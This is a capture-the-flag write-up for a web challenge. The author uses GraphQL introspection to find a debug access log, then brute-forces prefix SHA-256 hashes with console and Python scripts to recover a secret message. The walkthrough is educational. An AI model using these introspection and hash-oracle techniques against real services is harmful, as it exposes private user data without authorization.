# Confessions

## Task

Categories: web

Difficulty: easy

Someone confessed their dirtiest secret on this new website: https://confessions.flu.xxx
Can you find out what it is?

## Solution

We can enter a title and message to confess. We can publish this message. We have a preview that shows us the hash of the message and the message itself.

Looking at the source code of the page we find the javascript.

On input it uses a GraphQL endpoint to fetch the information.

```javascript
const gql = async (query, variables={}) => {
    let response = await fetch('/graphql', {
        method: 'POST',
        headers: {
            'content-type': 'application/json',
        },
        body: JSON.stringify({
            operationName: null,
            query,
            variables,
        }),
    });
    let json = await response.json();
    if (json.errors && json.errors.length) {
        throw json.errors;
    } else {
        return json.data;
    }
};
```

There is an example call:

```javascript
gql('mutation Q($id: String) { confessionWithMessage(id: $id) { title, hash, message } }', { id });
```

I never used GraphQL before so the first thing I did was finding out how to
 - not limit the query to a specific hash or id (didn't work)
 - view the structure of the stored data

 So I found this: https://graphql.org/learn/introspection/

 Using `{ __schema { types { name fields { name description } } } }` with `gql` in the developer console reveals some interesting information:
 - There is a `Confession` and `Access` type
 - The `Query` type has an additional `accessLog` field with the description `Show the resolver access log. TODO: remove before production release`
 - The `Access` type has `timestamp` `name` and `args` fields

 Let's query the `accessLog`:

 ```javascript
 var data = await gql('{ accessLog { timestamp name args } }', {  });
 data.accessLog.forEach(x => console.log(x));
 ```

 We see that all important information is redacted. Let's filter out the hashes:

 ```javascript
 var hashes = new Set(data.accessLog.map(x => JSON.parse(x.args).hash).filter(x => x));
 hashes.forEach(hash => gql('query Q($hash: String) { confession(hash: $hash) { id, title, hash } }', { hash }).then(d => console.log(d.confession)));
 ```

 We see that `id` is always null. We also see that there are multiple entries with the title flag and a hash, our own tests are also visible. We didn't publish a single one, but there are multiple entries. While we were typing the hash was constantly changing.

 Maybe the first hash is the hash of the first char, the second hash with two chars and so on. Let's verify that real quick:

 ```python
>>> from hashlib import sha256
>>> alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"
>>> for c in alphabet:
...   if sha256(c.encode("utf-8")).hexdigest() == "252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111":
...     print(c)
f
 ```

 Okay, let's write a script to do the work for us and bruteforce the flag.

 First, extract all hashes:

 ```javascript
var out = [];
for (let hash of hashes) {
  let data = await gql('query Q($hash: String) { confession(hash: $hash) { id, title, hash } }', { hash });
  if (data.confession.title === "Flag") {
    out[out.length] = data.confession.hash;
  }
};
// wait some time
console.log(out);
```

Now we can export that to python and write a script:

```python
from hashlib import sha256

hashes = [
"252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111",
"593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6",
"c310f60bb9f3c59c43c73ff8c7af10268de81d4f787eb04e443bbc4aaf5ecb83",
"807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87",
"0577f6995695564dbf3e17ef36bf02ee73ba10ab300caf751315615e0fc6dd37",
"9271dd87ec1a208d1a6b25f8c4e3b21e36c75c02b62fafc48cf1327bac220e48",
"95f5e39cb28767940602ce3241def53c42d399ae1daf086c9b3863d50a640a81",
"62663931ff47a4c77e88916d96cad247f6e2c352a628021a1b60690d88625d75",
"5534607d1f4ee755bc11d75d082147803841bc3959de77d6159fca79a637ac77",
"52a88481cc6123cc10f4abb55a0a77bf96d286f457f6d7c3088aaf286c881b76",
"7ffcb9b3a723070230441d3c7aee14528ca23d46764c78365f5fdf24d0cdef53",
"532e4cecd0320ccb0a634956598c900170bd5c6f1f22941938180fe719b61d37",
"a4b24c8f4f14444005c7023e9d2f75199201910af98aaef621dc01cb6e63f1d1",
"1092c20127f3231234eadf0dd5bee65b5f48ffbdc94e5bf928e3605781a8c0d1",
"1e261929cc13a0e9ecf66d3e6508c14b79c305fa10768b232088e6c2bfb3efa3",
"0bb629dfb5bf8a50ef20cfff123756005b32a6e0db1486bd1a05b4a7ddfd16c7",
"0141c897af69e82bc9fde85a4c99b6e693f6eb390b9abdeda4a34953f82efa4b",
"c20ee107ba4d41370cc354bb4662f3efb6b7c14e7b652394aaa1ad0341e4a1c9",
"d6b977c1deb6179c7b9ac11fb2ce231b100cf1891a1102d02d8f7fbea057b8a0",
"fb7dc9b1be6477cea0e23fdc157ff6b67ce075b70453e55bb22a6542255093f1",
"70b652dad63cabed8241c43ba5879cc6d509076f778610098a20154eb8ac1b89",
"26f4fc4aba06942e5e9c5935d78da3512907fe666e1f1f186cf79ac14b82fcad",
"c31c26dbbcf2e7c21223c9f80822c6b8f413e43a2e95797e8b58763605aaca0d",
"eb992e46fb842592270cd9d932ba6350841966480c6de55985725bbf714a861d",
"c21af990b2bd859d99cfd24330c859a4c1ae2f13b0722962ae320a460c5e0468",
"ebf2b799b6bf20653927092dae99a6b0fc0094abc706ca1dce66c5d154b4542d",
"07a272d52750c9ab31588402d5fb8954e3e5174fcab9291e835859a5f8f34cf9",
"5a047cba5d6e0cf62d2618149290180e1476106d71bd9fdb7b1f0c41437c2ff5"
]

chars = [chr(i).encode("utf-8") for i in range(256)]
solve = b''

for hash in hashes:
  for char in chars:
    if sha256(solve + char).hexdigest() == hash:
      solve += char

print(solve.decode("utf-8"))
```

Running it:

```bash
$ python solve.py
flag{but_pls_d0nt_t3ll_any1}
```
